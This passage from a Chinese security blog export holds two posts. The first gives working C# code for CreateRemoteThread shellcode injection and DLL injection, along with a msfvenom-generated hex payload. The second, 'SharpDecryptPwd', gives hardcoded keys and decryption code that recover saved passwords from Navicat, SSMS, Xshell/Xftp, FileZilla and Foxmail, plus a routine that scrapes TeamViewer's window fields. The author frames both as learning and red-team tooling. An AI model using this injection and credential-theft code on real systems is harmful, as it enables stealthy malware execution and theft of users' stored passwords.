    <content type="text"><![CDATA[通过 CreateRemoteThread API 进行代码与 DLL 注入。 0x00 前言某日看到收藏夹里头的 Ten Process Injection Techniques: A Technical Survey Of Common And Trending Process Injection Techniques ，里头总结得很到位，在国内的几个流行的安全媒体上也见过译文。 通过对进程注入技术的学习和理解，个人觉得整个过程非常有趣，故以此作为 C# 代码学习的方向（Windows API 利用），并编写有助于学习和开发的代码。 注意： 我不是第一个编写这样代码的人，Github 有一大堆代码示例。 0x01 什么是进程注入进程注入是一种广泛应用于恶意软件和无文件攻击中的逃避技术，这意味着可以将自定义代码运行在另一个进程的地址空间内。进程注入提高了隐蔽性，也实现了持久化。尽管有非常多的进程注入技术，本文所述是最常用的进程注入技术之一。 0x02 VirtualAllocEx =&gt; WriteProcessMemory 模式CreateRemoteThread 是 Win32 API 提供的一个函数，用于在另一个进程中创建线程。在另一个应用程序中创建线程之前，必须满足两个条件。 尝试在另一个进程中创建线程的进程必须具有创建线程的权限。简单来说，必须有与目标进程相同或更高的权限（目标指的是我们想要创建线程的进程） 两个进程必须在同一会话中。如果会话标识符不匹配，则不会创建线程。 如果不满足上述任何一个条件，则操作系统本身将拒绝代码注入这一过程。这不是 Windows 操作系统体系结构中的安全漏洞，而是由操作系统提供的功能。由于我们无法修改具有比我们更高权限的进程，因此不会跨越任何安全边界。 为了通过 CreateRemoteThread API 实现代码注入，我们遵循以下流程： 代码示意： 123456789101112131415161718192021222324252627282930313233public static void CodeInject(int pid, byte[] buf)&#123; try &#123; uint lpNumberOfBytesWritten = 0; uint lpThreadId = 0; Console.WriteLine($&quot; [&gt;] 获取进程ID &#123;pid&#125; 的句柄.&quot;); IntPtr pHandle = OpenProcess((uint)ProcessAccessRights.All, false, (uint)pid); Console.WriteLine($&quot; [&gt;] 打开进程id &#123; pid &#125; 的句柄 &#123;pHandle&#125;.&quot;); Console.WriteLine($&quot; [&gt;] 分配内存以注入shellcode.&quot;); IntPtr rMemAddress = VirtualAllocEx(pHandle, IntPtr.Zero, (uint)buf.Length, (uint)MemAllocation.MEM_RESERVE | (uint)MemAllocation.MEM_COMMIT, (uint)MemProtect.PAGE_EXECUTE_READWRITE); Console.WriteLine($&quot; [&gt;] Shellcode 的内存分配在 0x&#123;rMemAddress&#125;.&quot;); Console.WriteLine($&quot; [&gt;] 在已分配的内存位置写入shellcode&quot;); if (WriteProcessMemory(pHandle, rMemAddress, buf, (uint)buf.Length, ref lpNumberOfBytesWritten)) &#123; Console.WriteLine($&quot; [&gt;] Shellcode写在进程内存中.&quot;); Console.WriteLine($&quot; [&gt;] 创建远程线程来注入 shellcode.&quot;); IntPtr hRemoteThread = CreateRemoteThread(pHandle, IntPtr.Zero, 0, rMemAddress, IntPtr.Zero, 0, ref lpThreadId); bool hCreateRemoteThreadClose = CloseHandle(hRemoteThread); Console.WriteLine($&quot; [&gt;] 成功将 shellcode 注入进程id &#123;pid&#125; 的内存中.&quot;); &#125; else &#123; Console.WriteLine($&quot; [!] 无法将shellcode注入进程id &#123;pid&#125; 的内存中.&quot;); &#125; bool hOpenProcessClose = CloseHandle(pHandle); &#125; catch (Exception ex) &#123; Console.WriteLine(&quot;[+] &quot; + Marshal.GetExceptionCode()); Console.WriteLine(ex.Message); &#125;&#125; Cobalt Strike 提供了两种在远程进程中分配内存并将数据复制到其中的选项，而其中默认使用项就是使用了 VirtualAllocEx -&gt; WriteProcessMemory 的经典模式，这模式也是红队工具中最常见的模式。此模式也适用于不同的进程体系结构。 当然，一个好的实现需要考虑到出现不同的极端情况，比如 x86 -&gt; x64， x64 -&gt; x86，不同上下文等，不过这不是本文的内容。 0x03 深入了解函数3.1 访问远程进程要对任何进程执行内存操作，我们必须能够访问到它。可以通过使用 OpenProcess 函数获得，该函数原型是： 它需要 3 个参数： DwDesiredAccess：对进程对象的请求访问权限。它将根据受害者进程的安全描述符进行检查。如果调用者启用了 SeDebugPrivilege 特权，则无论安全描述符的内容如何，都会授予所请求的访问权限。 bInheritHandle：如果此值为 TRUE，则此进程创建的进程将继承该句柄。否则，进程不会继承此句柄。 dwProcessId：这是受害者进程的进程标识符。 如果函数成功，则返回值是指定进程的打开句柄，其他 API函数可以使用它来操作受害进程的内存。失败时，返回 NULL。 3.2 为 shellcode 分配空间一旦我们获得进程的句柄，我们继续为内存中的 shellcode 分配空间。这是通过使用 VirtualAllocEx API 调用完成的。 它需要 5 个参数： hProcess：进程的句柄。该函数在此进程的虚拟地址空间内分配内存。句柄必须具有PROCESS_VM_OPERATION访问权限。 lpAddress：指向受害者进程内存中指定地址的指针。如果参数指定为 NULL，则该函数回自动选择要分配的内存页面。 dwSize：要分配的内存区域的大小，它以字节为单位。 flAllocationType：指定要分配的内存类型。此参数必须包含以下值之一。：MEM_COMMIT、MEM_RESERVE、MEM_RESET、MEM_RESET_UNDO。 flProtect：要分配的页面区域的内存保护。出于我们的目的，它将包含我们要执行的代码，并且我们希望它可读可写，我们将其设置为 PAGE_EXECUTE_READWRITE。 该函数在成功时返回分配的基址，而失败时，返回 NULL。 此时我们已经成功设法在进程中分配可执行内存。 3.3 在远程进程中写入 shellcode现在，我们需要在分配的区域中写入 shellcode。为此，我们有一个名为 WriteProcessMemory 的函数。 WriteProcessMemory 是一个函数，它将调用者的数据写入指定进程的内存区域。需要注意的时整个内存区域必须时可写的，否则函数会失败，这就是为什么我们要将内存分配为可写，并与可读和可执行文件一起分配。 它需要 5 个参数。 hProcess：要修改的进程内存的句柄。句柄必须具有 PROCESS_VM_WRITE 和 PROCESS_VM_OPERATION 访问权限。 lpBaseAddress：指向写入数据的指定进程中的基址的指针（我们想要写入数据的地址）。在发生数据传输之前，系统会验证指定大小的基址和内存中的所有数据是否都可以进行写访问，如果无法访问，则该函数将失败。 lpBuffer：指向缓冲区的指针，指针补习时const指针。该缓冲区包含要在指定进程的地址空间中写入的数据。 nSize：要写入指定进程的字节数。 lpNumberOfBytesWritten：指向变量的指针，该变量接收传输到指定进程的字节数。此参数是可选的。如果 lpNumberOfBytesWritten 为 NULL，则忽略该参数。 如果函数由于某些原因而失败，则返回 false，如果成功则返回 true。 此时，stage 已全部设置，所需的只是在远程进程中创建一个线程并运行它。 3.4 执行 shellcode为了在远程进程中创建线程，我们使用 Win32 API 提供的 CreateRemoteThread 函数。 它需要 7 个参数，其中只有 3 个是我们感兴趣的。其余的可以通过调整它们获得默认值，可以对新创建的线程进行更多控制。 我们感兴趣的参数是： hProcess：要创建线程的进程的句柄。 lpStartAddress：它是指向 THREADSTARTROUTINE 的指针，THREADSTARTROUTINE 是线程创建后开始执行代码的位置。 lpParameter：指向 LPTHREAD_START_ROUTINE 所需参数的指针。因为在这种情况下，它是一个普通的shellcode，它不期望任何参数，因此，我们将它保持为 NULL 。此参数在 DLL 注入中具有价值。 0x04 演示利用 msfvenom 生成 shellcode 123456789101112rcoil@MacBookPro  ~  msfvenom -p windows/x64/exec CMD=calc exitfunc=thread -b "\x00" -f hex[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload[-] No arch selected, selecting arch: x64 from the payloadFound 3 compatible encodersAttempting to encode payload with 1 iterations of generic/nonegeneric/none failed with Encoding failed due to a bad character (index=7, char=0x00)Attempting to encode payload with 1 iterations of x64/xorx64/xor succeeded with size 311 (iteration=0)x64/xor chosen with final size 311Payload size: 311 bytesFinal size of hex file: 622 bytes4831c94881e9deffffff488d05efffffff48bbc690bbfdf6dbd2a448315827482df8ffffffe2f43ad83819063312a4c690faacb78b80f590d88a2f939359f6a6d830afee9359f6e6d8308fa693dd138cdaf6cc3f93e3646aacda81f4f7f2e50759b6bcf71a304994d1eab57d89f22f84acf3fc2650522cc690bbb5731ba6c38e916bad7d93cae04dd09bb4f70b31f28e6f72bc7def5aecc746f6cc3f93e3646ad17a34fb9ad365fe70ce0cbad89e80ced5822c83038ae04dd09fb4f70bb4e54d9cf3b97d9bceedc740fa76f2539aa516d1e3bcae858bfe87c8faa4b7819a272ab0faaf093b8ae59fcaf376e432855b396fe6b54cdad2a4c690bbfdf6935f29c791bbfdb761e32fa91744284d3bcf8eccd1015b63664f5b13d83839dee7d4d8cc10401d83de69e3d5e2d497f682932d1c6f6e9e97b7b1a4 运行结果： 0x05 DLL 注入5.1 什么是DLL？动态链接库（DLL）是一个包含代码的文件，程序已加载该文件以在运行时执行一个或多个操作。 5.2 什么是DLL注入？DLL 注入是一个将 DLL 注入到正在运行中的进程的过程，该进程可能包含恶意代码，可用于执行恶意活动。 5.3 相关函数 GetModuleHandleA ：检索已由调用进程加载的指定模块的模块句柄。 GetProcAddress ：从指定的动态链接库（DLL）中检索导出的函数或变量的地址。 5.4 示例代码DLL 注入，只需要在上面的基础上引入 LoadLibrary 即可。 代码部分只需要修改以下内容即可 1234567891011121314151617181920212223242526272829303132333435public static void DLLInject(int pid, byte[] buf)&#123; try &#123; uint lpNumberOfBytesWritten = 0; uint lpThreadId = 0; Console.WriteLine($&quot; [&gt;] 获取进程ID &#123;pid&#125; 的句柄.&quot;); IntPtr pHandle = OpenProcess((uint)ProcessAccessRights.All, false, (uint)pid); Console.WriteLine($&quot; [&gt;] 打开进程id &#123; pid &#125; 的句柄 &#123;pHandle&#125;.&quot;); IntPtr loadLibraryAddr = GetProcAddress(GetModuleHandleA(&quot;kernel32.dll&quot;), &quot;LoadLibraryA&quot;); Console.WriteLine($&quot; [&gt;] LoadLibraryA 的导出函数地址是 &#123;loadLibraryAddr&#125; .&quot;); Console.WriteLine($&quot; [&gt;] 分配 DLL 路径的内存.&quot;); IntPtr rMemAddress = VirtualAllocEx(pHandle, IntPtr.Zero, (uint)buf.Length, (uint)MemAllocation.MEM_RESERVE | (uint)MemAllocation.MEM_COMMIT, (uint)MemProtect.PAGE_EXECUTE_READWRITE); Console.WriteLine($&quot; [&gt;] 注入 DLL 路径的内存分配在 0x&#123;rMemAddress&#125;.&quot;); Console.WriteLine($&quot; [&gt;] 在已分配的内存位置写入 DLL 路径.&quot;); if (WriteProcessMemory(pHandle, rMemAddress, buf, (uint)buf.Length, ref lpNumberOfBytesWritten)) &#123; Console.WriteLine($&quot; [&gt;] DLL 路径写在目标进程内存中.&quot;); Console.WriteLine($&quot; [&gt;] 创建远程线程来注入 DLL.&quot;); IntPtr hRemoteThread = CreateRemoteThread(pHandle, IntPtr.Zero, 0, loadLibraryAddr, rMemAddress, 0, ref lpThreadId); bool hCreateRemoteThreadClose = CloseHandle(hRemoteThread); Console.WriteLine($&quot;[&gt;] 成功将 DLL 注入进程id &#123;pid&#125; 的内存中.&quot;); &#125; else &#123; Console.WriteLine($&quot; [!] 无法将 DLL 注入进程id &#123;pid&#125; 的内存中.&quot;); &#125; bool hOpenProcessClose = CloseHandle(pHandle); &#125; catch (Exception ex) &#123; Console.WriteLine(&quot;[+] &quot; + Marshal.GetExceptionCode()); Console.WriteLine(ex.Message); &#125;&#125; 0x06 来源参考https://3xpl01tc0d3r.blogspot.com/2019/08/process-injection-part-i.html https://pwnrip.com/demystifying-code-injection-techniques-part-1-shellcode-injection/ https://blog.cobaltstrike.com/2019/08/21/cobalt-strikes-process-injection-the-details/]]></content>
      <categories>
        <category>编程之道</category>
      </categories>
      <tags>
        <tag>C#</tag>
        <tag>Tools</tag>
        <tag>知识回顾</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[【编程】SharpDecryptPwd]]></title>
    <url>%2F2019%2F09%2F%E3%80%90%E7%BC%96%E7%A8%8B%E3%80%91SharpDecryptPwd%2F</url>
    <content type="text"><![CDATA[这是一篇对密码已保存在 Windwos 系统上的部分程序进行解析。 0x00 前言在 Windows 系统下保存密码，无非就只存在于两个位置：注册表、文件。所以下文主要也是从注册表项、session文件中获取相关加密后的密码字段。且文章中所涉及的知识点，出处全在文末来源参考中，本文仅仅是个人的理解及整合。 主要对以下几个程序进行解析 1234561、Navicat PremiumSoft2、SQL Server Management Studio3、Xmanager --&gt; Xshell,Xftp4、TeamView5、FileZille.... PS: 可以使用 Process Monitor 监测进程的操作。 0x01 Navicat PremiumSoft​ Navicat 的 session 信息是保存在注册表中的。以 MySql 为例 Navicat 中的 MySQL 配置（注册表路径）​ 上图注册表中，保存着我们需要的Host、UserName、PassWord等字段。以下是数据库类型对应注册表路径表 数据库类型注册表路径 MySQL HKEY_CURRENT_USER\Software\PremiumSoft\Navicat\Servers MariaDB HKEY_CURRENT_USER\Software\PremiumSoft\NavicatMARIADB\Servers MongoDB HKEY_CURRENT_USER\Software\PremiumSoft\NavicatMONGODB\Servers Microsoft SQL HKEY_CURRENT_USER\Software\PremiumSoft\NavicatMSSQL\Servers Oracle HKEY_CURRENT_USER\Software\PremiumSoft\NavicatOra\Servers PostgreSQL HKEY_CURRENT_USER\Software\PremiumSoft\NavicatPG\Servers SQLite HKEY_CURRENT_USER\Software\PremiumSoft\NavicatSQLite\Servers 1.1 如何加密Navicat 使用 Blowfish算法（河豚密码）加密密码字符串。以下是 Navicat 所做的事情： 生成密钥 Navicat使用SHA-1算法生成160位密钥； 对 3DC5CA39 字符串取其 SHA-1摘要，长度为8个字节，这字符串是 Blowfish算法中使用的密钥； 确切的值是：1234byte[] Key = &#123; 0x42, 0xCE, 0xB2, 0x71, 0xA5, 0xE4, 0x58, 0xB7, 0x4A, 0xEA, 0x93, 0x94, 0x79, 0x22, 0x35, 0x43, 0x91, 0x87, 0x33, 0x40&#125;; 初始化向量（IV） 因为 Blowfish算法每次只能加密一个8字节长的块； 所以开始时，Navicat 用 0xFF 填充一个8字节长的块，然后利用上面提到的 Key 进行 Blowfish 加密，得到 8字节长的初始向量（IV）； 确切的值是：123byte[] IV = &#123; 0xD9, 0xC7, 0xC3, 0xC8, 0x87, 0x0D, 0x64, 0xBD&#125;; 加密 rawPass 字符串 rawPass 字符串是ASCII字符串，且不考虑 “NULL” 终止符。 Navicat 使用管道来加密 rawPass 字符串。管道如下所示： Blowfish 加密注意：每个明文块都是一个8字节长的块。只有当最后一个明文块不是8字节长时，才能执行上图中显示的最后一步。 1.2 加密过程（C#）123456789101112131415161718192021222324252627282930public string EncryptString(string plaintext) &#123; byte[] plaintext_bytes = Encoding.UTF8.GetBytes(plaintext); byte[] CV = Enumerable.Repeat&lt;byte&gt;(0xFF, Blowfish.BlockSize).ToArray(); blowfishCipher.Encrypt(CV, Blowfish.Endian.Big); string ret = ""; int blocks_len = plaintext_bytes.Length / Blowfish.BlockSize; int left_len = plaintext_bytes.Length % Blowfish.BlockSize; byte[] temp = new byte[Blowfish.BlockSize]; for (int i = 0; i &lt; blocks_len; ++i) &#123; Array.Copy(plaintext_bytes, Blowfish.BlockSize * i, temp, 0, Blowfish.BlockSize); XorBytes(temp, CV, Blowfish.BlockSize); blowfishCipher.Encrypt(temp, Blowfish.Endian.Big); XorBytes(CV, temp, Blowfish.BlockSize); ret += ByteArrayToString(temp); &#125; if (left_len != 0) &#123; blowfishCipher.Encrypt(CV, Blowfish.Endian.Big); XorBytes(CV, plaintext_bytes.Skip(blocks_len * Blowfish.BlockSize).Take(left_len).ToArray(), left_len); ret += ByteArrayToString(CV.Take(left_len).ToArray()); &#125; return ret;&#125; 1.3 解密过程12345678910111213141516171819202122232425262728293031public string DecryptString(string ciphertext) &#123; byte[] ciphertext_bytes = StringToByteArray(ciphertext); byte[] CV = Enumerable.Repeat&lt;byte&gt;(0xFF, Blowfish.BlockSize).ToArray(); blowfishCipher.Encrypt(CV, Blowfish.Endian.Big); byte[] ret = new byte[0]; int blocks_len = ciphertext_bytes.Length / Blowfish.BlockSize; int left_len = ciphertext_bytes.Length % Blowfish.BlockSize; byte[] temp = new byte[Blowfish.BlockSize]; byte[] temp2 = new byte[Blowfish.BlockSize]; for (int i = 0; i &lt; blocks_len; ++i) &#123; Array.Copy(ciphertext_bytes, Blowfish.BlockSize * i, temp, 0, Blowfish.BlockSize); Array.Copy(temp, temp2, Blowfish.BlockSize); blowfishCipher.Decrypt(temp, Blowfish.Endian.Big); XorBytes(temp, CV, Blowfish.BlockSize); ret = ret.Concat(temp).ToArray(); XorBytes(CV, temp2, Blowfish.BlockSize); &#125; if (left_len != 0) &#123; Array.Clear(temp, 0, temp.Length); Array.Copy(ciphertext_bytes, Blowfish.BlockSize * blocks_len, temp, 0, left_len); blowfishCipher.Encrypt(CV, Blowfish.Endian.Big); XorBytes(temp, CV, Blowfish.BlockSize); ret = ret.Concat(temp.Take(left_len).ToArray()).ToArray(); &#125; return Encoding.UTF8.GetString(ret);&#125; 效果如下： Navicat PremiumSoft 解密结果 0x02 SSMS​以 session 文件名及位置来划分，SSMS 可以分为 3 个大版本。（保存的文件都是标准的.net二进制序列化文件） Version Session File Path SSMS 2005 %appdata%\Microsoft\Microsoft SQL Server\90\Tools\Shell\mru.dat SSMS 2008 %appdata%\Microsoft\Microsoft SQL Server\100\Tools\Shell\SqlStudio.bin SSMS Other %appdata%\Microsoft\SQL Server Management Studio\xxxx\SqlStudio.bin 这章节，所要表达的内容在 SQL Server Management Studio密码导出工具 当中已经分析得很详细了，故不多写。 PS：因为要加载私有程序集，故此程序无法在 Cobalt Strike 中使用，原因未知。 SharpSSMSPwd 解密结果 0x03 Xmanager​ 有人问 session 文件里保存的密码是以什么方式保存的，被盗了后果是否很严重？官方给出了下面的答案 123-What is the obfuscation algorithm?It is not obfuscating password. Xshell uses RC4 with SHA256. 当然，这是 5.1 版本之后所使用的。 如今的 Xmanager 大致可分为 2 个大版本。版本名及产生的 session 文件位置如下： 产品 会话文件位置 XShell 5 %userprofile%\Documents\NetSarang\Xshell\Sessions XFtp 5 %userprofile%\Documents\NetSarang\Xftp\Sessions XShell 6 %userprofile%\Documents\NetSarang Computer\6\Xshell\Sessions XFtp 6 %userprofile%\Documents\NetSarang Computer\6\Xftp\Sessions 以下以 XShell 6 为例 3.1 如何加密​ 版本的不同，其加密方式也不一样。以下为默认设置下的加密行为。 版本 &lt; 5.1 Xshell 采用以字符串!X@s#h$e%l^l&amp; 的 MD5 值作为作为 RC4 加密算法中的密钥，以下是加密实现： 123456789from hashlib import *from Crypto.Cipher import ARC4from base64 import *#MD5 = ba2d9b7e9cca73d152b26772662df55ecipher = ARC4.new(md5(b'!X@s#h$e%l^l&amp;').digest())print(b64encode(cipher.encrypt(b'RcoIl')).decode())# +amcdP4= Xftp 同理，以 !X@s#c$e%l^l&amp; 的 MD5 值作为密钥，与 Xshell 所使用的字符串仅一个字符之分。 123456789from hashlib import *from Crypto.Cipher import ARC4from base64 import *#MD5 = 306e9835de9291d227bb28b2f72dca33cipher = ARC4.new(md5(b'!X@s#c$e%l^l&amp;').digest())print(b64encode(cipher.encrypt(b'RcoIl')).decode())# SvmUuQg= 版本 = 5.1 or 5.2 Xshell 和 Xftp 都使用 SHA-256 摘要算法生成密钥，作为 RC4 加密中使用的密钥。 以当前用户账户的 SID 作为 SHA-256 摘要，长度为 32 个字节的数组。SID 可通过 whoami /user 进行获取，如下所示： 12345678910111213141516C:\Users\RcoIl&gt;whoami /user用户信息----------------用户名 SID============== =============================================rcoil-pc\rcoil S-1-5-21-3990929841-153547143-3340509336-1001SHA-256: a6a7f87e9ab607e8ec70446569ff86919a55417c9259b8e866afb1403fb17a27byte[] Key = &#123; 0xA6, 0xA7, 0xF8, 0x7E, 0x9A, 0xB6, 0x07, 0xE8, 0xEC, 0x70, 0x44, 0x65, 0x69, 0xFF, 0x86, 0x91, 0x9A, 0x55, 0x41, 0x7C, 0x92, 0x59, 0xB8, 0xE8, 0x66, 0xAF, 0xB1, 0x40, 0x3F, 0xB1, 0x7A, 0x27&#125;; 版本 &gt; 5.2 而 5.2 版本之后的 Xshell 与 Xftp，与之前只是多加了一个用户名。如 12345678910#user+sidRcoIlS-1-5-21-3990929841-153547143-3340509336-1001SHA-256: 5e53a13c5e98d02f8100ce62deb6e0dfec2a2361ba3c7fdd84dceb00554264bbbyte[] Key = &#123; 0x5E, 0x53, 0xA1, 0x3C, 0x5E, 0x98, 0xD0, 0x2F, 0x81, 0x00, 0xCE, 0x62, 0xDE, 0xB6, 0xE0, 0xDF, 0xEC, 0x2A, 0x23, 0x61, 0xBA, 0x3C, 0x7F, 0xDD, 0x84, 0xDC, 0xEB, 0x00, 0x55, 0x42, 0x64, 0xBB&#125;; 设置了 Master Key 的情况下（5.1 版本之后） 如果设置了 主密码，则以主密码的 SHA-256摘要作为 RC4 加密中使用的密钥。例如： 123456Master Key:yingyingyingbyte[] Key = &#123; 0x5E, 0xF9, 0xB6, 0x86, 0xF8, 0xE1, 0xCE, 0x51, 0xCB, 0xCD, 0xCB, 0x2F, 0xC7, 0x2B, 0x33, 0xB4, 0x3B, 0x17, 0xF3, 0xE6, 0xE9, 0x40, 0x23, 0x65, 0x4C, 0x68, 0xF0, 0xB7, 0xEC, 0xD6, 0x59, 0xF5&#125;; 3.2 加密过程（C#）​ 假设我们的密码是 root，则它的 SHA-256 摘要将作为附加加密数据。 12345byte[] Key = &#123; 0x48, 0x13, 0x49, 0x4D, 0x13, 0x7E, 0x16, 0x31, 0xBB, 0xA3, 0x01, 0xD5, 0xAC, 0xAB, 0x6E, 0x7B, 0xB7, 0xAA, 0x74, 0xCE, 0x11, 0x85, 0xD4, 0x56, 0x56, 0x5E, 0xF5, 0x1D, 0x73, 0x76, 0x77, 0xB2&#125;; Python 版本 123456789101112from base64 import b64encode, b64decodefrom Crypto.Hash import MD5, SHA256from Crypto.Cipher import ARC4UserSid = "RcoIlS-1-5-21-3990929841-153547143-3340509336-1001"rawPass = "root"cipher = ARC4.new(SHA256.new(UserSid).digest())checksum = SHA256.new(rawPass).digest()ciphertext = cipher.encrypt(rawPass)print b64encode(ciphertext + checksum).decode()==》 klSqckgTSU0TfhYxu6MB1ayrbnu3qnTOEYXUVlZe9R1zdney 3.3 解密过程（C#） Python 版本 1234567891011from base64 import b64encode, b64decodefrom Crypto.Hash import MD5, SHA256from Crypto.Cipher import ARC4UserSid = "RcoIlS-1-5-21-3990929841-153547143-3340509336-1001"rawPass = "klSqckgTSU0TfhYxu6MB1ayrbnu3qnTOEYXUVlZe9R1zdney"data = b64decode(rawPass)Cipher = ARC4.new(SHA256.new((UserSid).encode()).digest())ciphertext, checksum = data[:-SHA256.digest_size], data[-SHA256.digest_size:]plaintext = Cipher.decrypt(ciphertext)print plaintext.decode() C# 版本 1234567891011121314string UserSid = "RcoIlS-1-5-21-3990929841-153547143-3340509336-1001";string rawPass = "klSqckgTSU0TfhYxu6MB1ayrbnu3qnTOEYXUVlZe9R1zdney";byte[] data = Convert.FromBase64String(rawPass);byte[] Key = new SHA256Managed().ComputeHash(Encoding.ASCII.GetBytes(UserSid));byte[] passData = new byte[data.Length - 0x20];Array.Copy(data, 0, passData, 0, data.Length - 0x20);byte[] decrypted = RC4Crypt.Decrypt(Key, passData);Console.WriteLine("Decrypt: &#123;0&#125;", Encoding.ASCII.GetString(decrypted)); ==》 Decrypt: root 结果如下所示： 以上所有测试均为工作组环境，因为在域环境解密失败，原因未知。 0x04 TeamView直接是通过获取 TeamView 的句柄，把窗体上所有控件的变量给读出来。 123456789101112131415161718192021222324252627public static bool EnumFunc(IntPtr hWnd, IntPtr lParam)&#123; StringBuilder sb = new StringBuilder(256); const int WM_GETTEXT = 0x0D; GetClassNameW(hWnd, sb, sb.Capacity); if (sb.ToString() == "Edit" || sb.ToString() == "Static") &#123; WindowInfo wnd = new WindowInfo(); wnd.hWnd = hWnd; wnd.szClassName = sb.ToString(); if (wnd.szClassName == "Edit") &#123; StringBuilder stringBuilder = new StringBuilder(256); SendMessage(hWnd, WM_GETTEXT, 256, stringBuilder); wnd.szWindowName = stringBuilder.ToString(); &#125; else &#123; GetWindowTextW(hWnd, sb, sb.Capacity); wnd.szWindowName = sb.ToString(); &#125; //Console.WriteLine("句柄=" + wnd.hWnd.ToString().PadRight(20) + " 类型=" + wnd.szClassName.PadRight(20) + " 名称=" + wnd.szWindowName); //add it into list wndList.Add(wnd); &#125; return true;&#125; 为了其兼容性，不对结果进行筛选，输出全部窗体内容信息 0x05 FileZilla从网上收集的信息得到： 在 Filezilla 2.X 版本中，密码正在进行异或处理并存储在 Registry 中; 在 Filezilla 3.x 版本中，密码以明文形式存储在 .xml文件中。 如今官方的最新版本为 FileZilla_3.44.2_win64_sponsored-setup，以此版本进行测试： ​ 直接读取 相关xml 的内容即可（recentservers.xml） 123456789101112131415161718192021222324252627282930313233public static void fileZilla() &#123; string FzPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), @"FileZilla\recentservers.xml"); try &#123; if (File.Exists(FzPath)) &#123; try &#123; var objXmlDocument = new XmlDocument(); objXmlDocument.Load(FzPath); Console.WriteLine("&#123;0,-20&#125;&#123;1,-8&#125;&#123;2,-15&#125;&#123;3,-15&#125;", "Host", "Port", "Username", "ratPass"); foreach (XmlElement XE in ((XmlElement)objXmlDocument.GetElementsByTagName("RecentServers")[0]).GetElementsByTagName("Server")) &#123; var Host = XE.GetElementsByTagName("Host")[0].InnerText; var Port = XE.GetElementsByTagName("Port")[0].InnerText; var User = XE.GetElementsByTagName("User")[0].InnerText; var Pass = (Encoding.UTF8.GetString(Convert.FromBase64String(XE.GetElementsByTagName("Pass")[0].InnerText))); if (!string.IsNullOrEmpty(Host) &amp;&amp; !string.IsNullOrEmpty(Port) &amp;&amp; !string.IsNullOrEmpty(User) &amp;&amp; !string.IsNullOrEmpty(Pass)) &#123; Console.WriteLine("&#123;0,-20&#125;&#123;1,-8&#125;&#123;2,-15&#125;&#123;3,-15&#125;", Host, Port, User, Pass); &#125; else &#123; break; &#125; &#125; &#125; catch &#123; &#125; &#125; &#125; catch &#123; &#125; &#125; ​ 效果如下 0x06 FoxmailFoxmail 将输入的密码和一个固定字符串做异或加密，然后在前面添加字符串 Password ，用于标记作用。 版本号 存储文件 固定异或字符串(加密密钥) Version 6.X Account.stg -v6.5 ~draGon~ 第一位异或值：5A Version 7.X Accounts.tdat -v7.0 Account.rec0 -v7.1 ~F@7％m$~ 第一位异或值：71 至于为什么是这个值，可以直接逆向查看，或者看看这篇文章 foxmail 邮箱密码密码原理和方法研究。 Foxmail Version 6.x 加密方法： 将原密文的第一位 16进制与 5A 进行 XOR异或 操作，然后替换掉原密文的第一位后，得到一个新密文 123456789105A 的由来string key = "~draGon~";byte[] data = Encoding.Default.GetBytes(key);int x = 0;for(int i = 0; i &lt; data.Length; i++)&#123; x += int.Parse(data[i].ToString());&#125;x %= 255;Console.WriteLine(x); // 90 =&gt; 5A 再将新密文从第二位开始分别与密钥 ~draGon~（7E647261476F6E7E）进行 XOR异或，并将此时得到的密文与原密文进行相减，得到明文的 16进制。 Account.stg 文件使用二进制格式存储并在前 0x800 字节内填充了一些十六进制数据，之后才是真正的账户信息，包括 POP3 和 SMTP 账户、密码。 POP3 和 SMTP 账户密码分别用 “POP3Password” 和 “ESMTPPassword” 来代表。密码使用十六进制格式并用 XOR 异或加密，密钥为“~draGon~”。 版本 7.X 同理。 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283/// &lt;summary&gt; /// Foxmail password decoder /// Credit: Jacob Soo /// https://github.com/jacobsoo/FoxmailRecovery/blob/c3263424dd961ec23868d03c9caad13fa5c017ee/Foxmail%20Password%20Recovery/Foxmail%20Password%20Recovery/SharedFunctions.cs#L72 /// https://github.com/lim42snec/foxmaildump/blob/ca29edc6d767b4e52ee939cdad1d0f8cd7c9f626/FoxmailDump.cpp#L34 /// &lt;/summary&gt; /// &lt;param name="ver"&gt;版本号&lt;/param&gt; /// &lt;param name="pHash"&gt;密文&lt;/param&gt; /// &lt;returns&gt;&lt;/returns&gt; public static String decodePW(int ver, String strHash) &#123; String decodedPW = ""; // 第一步：定义不同版本的秘钥 int[] a; // fc0 的值是根据版本密钥，以字节为单位将16进制密文转成10进制，十进制之和求余。（x %=255;） int fc0; if (ver == 0) // Version 6 &#123; int[] v6a = &#123; '~', 'd', 'r', 'a', 'G', 'o', 'n', '~' &#125;; a = v6a; fc0 = Convert.ToInt32("5A", 16); //90 &#125; else // Version 7 &#123; int[] v7a = &#123; '~', 'F', '@', '7', '%', 'm', '$', '~' &#125;; a = v7a; fc0 = Convert.ToInt32("71", 16); // 113 &#125; // 第二步：以字节为单位将16进制密文转成10进制 int size = strHash.Length / 2; int index = 0; int[] b = new int[size]; for (int i = 0; i &lt; size; i++) &#123; b[i] = Convert.ToInt32(strHash.Substring(index, 2), 16); index = index + 2; &#125; // 第三步：将第一个元素替换成与指定数异或后的结果 int[] c = new int[b.Length]; c[0] = b[0] ^ fc0; Array.Copy(b, 1, c, 1, b.Length - 1); // 第四步：不断扩容拷贝自身 while (b.Length &gt; a.Length) &#123; int[] newA = new int[a.Length * 2]; Array.Copy(a, 0, newA, 0, a.Length); Array.Copy(a, 0, newA, a.Length, a.Length); a = newA; &#125; int[] d = new int[b.Length]; for (int i = 1; i &lt; b.Length; i++) &#123; d[i - 1] = b[i] ^ a[i - 1]; &#125; int[] e = new int[d.Length]; for (int i = 0; i &lt; d.Length - 1; i++) &#123; if (d[i] - c[i] &lt; 0) &#123; e[i] = d[i] + 255 - c[i]; &#125; else &#123; e[i] = d[i] - c[i]; &#125; decodedPW += (char)e[i]; &#125; return decodedPW; &#125; 到目前为止，此版本支持 6.5 至 7.2 版的数据恢复，但是这里只是测试了 7.2版本，效果如下 来源参考https://github.com/DoubleLabyrinth/how-does-navicat-encrypt-passwordSQL Server Management Studio密码导出工具https://github.com/zcgonvh/SSMSPwdhttps://github.com/DoubleLabyrinth/how-does-Xmanager-encrypt-passwordhttps://cloud.tencent.com/developer/news/261135https://www.t00ls.net/viewthread.php?tid=51996&amp;extra=&amp;highlight=teamview&amp;page=1]]></content>
      <categories>
        <category>编程之道</category>
      </categories>
      <tags>
